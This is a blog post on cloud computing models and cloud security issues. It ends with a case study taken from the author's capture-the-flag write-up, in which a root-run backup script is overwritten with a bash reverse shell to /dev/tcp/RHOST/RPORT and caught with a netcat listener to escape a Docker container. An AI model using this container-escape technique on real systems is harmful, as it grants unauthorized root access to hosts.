---
layout: post
title: Cloud Secuirty issues and solutions
categories: CyberSecurity
author: ThelastVvV
date: '2021-11-06 05:00:53 +0000'
tags:
  - blog
  - CyberSecurity
  - science
published: true

---


### Table of Contents :
1. [Introduction](#Introduction)
2. [Cloud Computing](#example2)
   1. [Deployment models](#Deployment)
   2. [Service models](#Service)
3. [Cloud Secuirty](#Cloud-Secuirty)
    1. [Issues](#issues)
    2. [Solution](#solutions)
4. [Thinking outside the box(Case Study)](#TOB)
<!-- toc -->



### Introduction:
 Cloud computing these day is a hot topic all over the world and in each tech newspaper you will read that from big tech companies massively investing in the cloud to goverments adopting the cloud as solution to IoT preparing to overtake cloud computing as primary industy technology ,simultaneously many concerns are rising from users data privacy to the cloud basic secuirty that why we need to understand the major cloud security issues and how to protect it and my suggestions to solve some of these basics issues.
### Cloud Computing  :
Cloud computing is technology of that uses as over internet services of storing and accessing data and programs remotely instead of traditional local computing .
#### Deployment models :
![1](https://i.imgur.com/rC0XesX.png)
Private cloud : owned and managed by one organization and a hosted cloud on a private network . Community cloud : owned and managed by one of the organization or third party but is shared between multiple organizations 
Public cloud: provider have hardware and infrastructure and any client access the services over the internet . 
Hybrid cloud : combinations set of the other clouds
#### Service models:
![1](https://www.redhat.com/cms/managed-files/iaas-paas-saas-diagram5.1-1638x1046.png)
SaaS Software As Service : that consumer use software application on cloud infrastructure which can been accessible from browser or program interface like google apps , netsuite  yahoo!mail...
PaaS Platform As Service  : that consumer can deploy onto cloud infrastructure  builded applications or important libraries , services and tools the user have control only over deployed applications and thier environment for example : Google App Engine, Apache Stratos, Red Hat OpenShift
Iaas Infrastructure As Service : the consumer get offer essential compute OS , networking resources (limited) and storage  a pay as you go services like AWS EC2,S3 ,Microsoft Azure ,Cisco Metacloud and rackspace
### Cloud Security  :
As many of organizations moved their data , app and assets to the cloud it become very important as we mentioned before to understand the issues and how to protect which we need to have a good sets of policies, controls , procedures and users educations to achieve our goal of protection against risks and attacks and to fix the issues. 
#### Issues :
The most major issues are  Data Breaches, availability and Data Loss, Account Hijacking , insecure authentication & authorization, ,Insecure and leaked APIs ,Denial of Service can shutdown the services ,Insufficient Due Diligence is an insufficiency of proper measures taken to ensure the credibility of the vendor Shared Technology Issues because of using of many services layers and if a shared platform component is compromised that will risk and exposes the entire environment  to be compromised .

#### Solutions:
The solution to all this issues in ensure to apply high measures of secure authentication and acces managment and validation of data management solutions and abilty to secure data also availability regrarding the data backup and recovery and daily security vulnerbality scanning with regular system configuration and patch managent and risk assesments  ,finally training employess about secuirt awareness and  personnel requirements, including clearances, roles, and responsibilities so eliminate any inside threats 
### Thinking outside the box(Case Study)  : 

After all the risks / issues and solutions we discussed previously and still many attacks on cloud occur per day  why ? simply cause threat actors are activly trying to find the way in the system finding a  mistake or fresh active vulnerability that can be exploited ...from my point of vue  most of exploited systems happens mostly from lazyness or a delayed patching of vulnerabilities and fixing misconfigurations so in this case study we talk about Containers as a Service (CaaS) "Cloud service model that allows users to upload, organize, start, stop, scale and otherwise manage containers, applications and clusters... Google Kubernetes and Docker Swarm are two examples of CaaS orchestration platforms" so CaaS can have same previous cloud services issues that can lead from compromise of a container image or container as a whole  to break out of the container and gain control over the host system. Now let demostrate how this clould be done !

```sh
cat backup.sh   
#!/bin/bash"
tar cf /root/container/backup/backup.tar /root/container
```
we have a backup.sh that runs every minute, taking the backup.tar to /root/container so  we  will need to edit this backupfile to reverse shell and bypass the docker-container so we just replace the backfile.tar to our reverse shell
```sh
echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/RHOST/RPORT 0>&1" >> backup.sh
```
![1](https://www.thelastvvv.com/images/posts/3/ttt2.jpg)

then we will Now we start listening to port

```sh
nc -lvnp RPORT
```
![2](https://www.thelastvvv.com/images/posts/3/ttt4.png)
As we can see that we successfully escaped the the docker countainer to the host root server.
So the solution is simple is a day by day vulnerability assessment and threat intelligence analysing to mitigate and patch any potential threats .

Note*: the demostration is done by me during an old CTF writeup.
##### References:
https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-144.pdf
https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-145.pdf
https://downloads.cloudsecurityalliance.org/initiatives/top_threats/The_Notorious_Nine_Cloud_Computing_Top_Threats_in_2013.pdf
https://webcache.googleusercontent.com/search?q=cache:XsiKlYeqYxEJ:https://www.ibm.com/services/cloud/containers-as-a-service+&cd=15&hl=en&ct=clnk&gl=ae
https://www.thelastvvv.com/ctf/2020/07/10/Dogcat-Writeup.html#privilege-escalation
https://www.redhat.com/en/topics/cloud-computing/iaas-vs-paas-vs-saas